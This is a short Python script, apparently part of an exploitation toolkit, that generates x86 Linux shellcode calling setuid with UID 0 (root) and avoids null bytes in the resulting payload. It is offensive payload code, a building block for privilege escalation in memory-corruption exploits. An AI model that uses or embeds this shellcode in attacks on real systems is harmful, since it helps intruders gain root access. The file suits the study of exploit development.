from struct import pack

##########################################################
#
#  1.  setuid shellcode
#  
#
#	                         random	     2014-04-21
##########################################################
des_format = 'shellcode: setuid(%s)' 
UID = 0
##########################################################


def setuid_shellcode(userid):
	shellcode = ''
	shellcode += '\x31\xc0'													#xor eax,eax
	shellcode += '\x31\xdb'													#xor ebx,ebx
	if (userid <= 0):
		pass
	elif (userid <= 0xff):
		shellcode += '\xb3' + pack('B',userid)							#mov bl,UID
	elif (userid > 0xff):
		if not (userid & 0xFF):
			shellcode += '\x66\xbb' + pack('H',userid+1)			#mov bx,(UID+1)
			shellcode += '\x66\x4b'											#dec bx
		else:
			shellcode += '\x66\xbb' + pack('H',userid)				#mov bx,(UID)
	shellcode += '\xb0\x17'													#mov ax,0x17
	shellcode += '\xcd\x80'													#int 0x80  -----> setuid(UID)
	return shellcode


if __name__ == '__main__':

	shellcode = setuid_shellcode(UID)
